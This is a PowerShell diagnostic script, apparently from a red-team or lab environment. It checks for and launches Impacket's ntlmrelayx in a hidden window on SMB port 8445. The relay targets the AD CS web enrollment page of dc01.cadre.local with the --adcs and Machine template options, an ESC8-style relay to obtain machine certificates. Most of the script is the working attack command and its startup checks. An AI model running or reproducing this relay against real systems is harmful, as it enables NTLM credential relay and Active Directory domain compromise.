# Diagnose ntlmrelayx startup on custom SMB port 8445
$ErrorActionPreference = "Continue"
$venv = "C:\Tools\RedStrike\.venv\Scripts"
$work = "C:\Tools\cadre-attack"
Set-Location $work

# Check for venv python
Write-Output "venv_python=$(Test-Path "$venv\python.exe")"
Write-Output "venv_pythonw=$(Test-Path "$venv\pythonw.exe")"
Write-Output "ntlmrelayx=$(Test-Path "$venv\ntlmrelayx.py")"

# Check ntlmrelayx --help for the smb-port flag
Write-Output "=== ntlmrelayx help (smb-port grep) ==="
& "$venv\python.exe" "$venv\ntlmrelayx.py" --help 2>&1 | Select-String -Pattern "smb-port|SMBListeningPort|listening" 
Write-Output "help_rc=$LASTEXITCODE"

# Try direct startup in foreground for a few seconds to capture banner/errors
Write-Output "=== direct foreground start (10s) ==="
$out = "$work\esc8-diag.out"
$err = "$work\esc8-diag.err"
Remove-Item $out,$err -ErrorAction SilentlyContinue
$p = Start-Process -FilePath "$venv\python.exe" `
  -ArgumentList @("$venv\ntlmrelayx.py","--smb-port","8445","-t","http://dc01.cadre.local/certsrv/certfnsh.asp","--adcs","--template","Machine","-smb2support","-ip","192.168.77.62","-debug") `
  -WorkingDirectory $work -RedirectStandardOutput $out -RedirectStandardError $err -PassThru -WindowStyle Hidden
Write-Output "pid=$($p.Id)"
Start-Sleep -Seconds 12
$listen = Get-NetTCPConnection -LocalPort 8445 -State Listen -ErrorAction SilentlyContinue
Write-Output "listening_8445=$([bool]$listen)"
if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }

Write-Output "=== stdout ==="
if (Test-Path $out) { Get-Content $out }
Write-Output "=== stderr ==="
if (Test-Path $err) { Get-Content $err }
Write-Output "=== DIAG_DONE ==="
